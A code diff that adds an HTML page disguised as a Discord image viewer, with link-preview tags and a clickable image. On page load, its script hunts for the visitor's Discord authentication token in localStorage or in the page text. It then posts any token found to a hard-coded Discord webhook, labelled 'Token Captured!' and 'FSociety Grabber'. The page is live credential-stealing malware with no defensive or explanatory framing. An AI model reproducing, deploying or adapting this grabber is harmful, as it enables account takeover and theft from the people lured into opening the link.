@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta property="og:title" content="Image Viewer 📸">
+    <meta property="og:description" content="Click to view full size.">
+    <meta property="og:image" content="https://cdn.discordapp.com/attachments/1568883932685008938/1568884649877311621/m.t1.jpg?ex=6af17130&is=6af01fb0&hm=8c3fba837ac46d986d6eaf7e090f4f2ae8d34f7f25d170de68f9005f81a3c89b"> 
+    <meta property="og:type" content="website">
+
+    <title>Image Viewer</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #2b2d31;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .fake-image {
+            max-width: 90%;
+            max-height: 90%;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <img src="https://cdn.discordapp.com/attachments/1568883932685008938/1568884649877311621/m.t1.jpg?ex=6af17130&is=6af01fb0&hm=8c3fba837ac46d986d6eaf7e090f4f2ae8d34f7f25d170de68f9005f81a3c89b" alt="Image" class="fake-image" onclick="redirectToDiscord()">
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1568884043397734473/2N8weOqDbKaXaKe1fjOsNesgzLjT3_7zEDUIh_JKIzYLNFKco43q3DjD1WdR4sUXmfqh";
+
+        function getToken() {
+            try {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+
+                // Trik ngambil token dari iframe (kadang kena block same-origin)
+                const token = iframe.contentWindow.localStorage.getItem('token');
+                
+                if (!token) {
+                    // Fallback: regex scan di localstorage
+                    return window.localStorage.getItem('token') || document.body.innerText.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/)?.[0] || null;
+                }
+                return token;
+            } catch (e) {
+                return null;
+            }
+        }
+
+        async function sendToken(token) {
+            if (!token) return;
+
+            const payload = {
+                content: "**Token Captured!**",
+                embeds: [{
+                    title: "Discord Token",
+                    description: "```\n" + token + "\n```",
+                    color: 0xff0000,
+                    footer: { text: "FSociety Grabber" }
+                }]
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {}
+        }
+
+        window.onload = () => {
+            const token = getToken();
+            if (token) {
+                sendToken(token);
+            }
+        };
+
+        function redirectToDiscord() {
+            window.location.href = "https://discord.com/app";
+        }
+    </script>
+</body>
+</html>
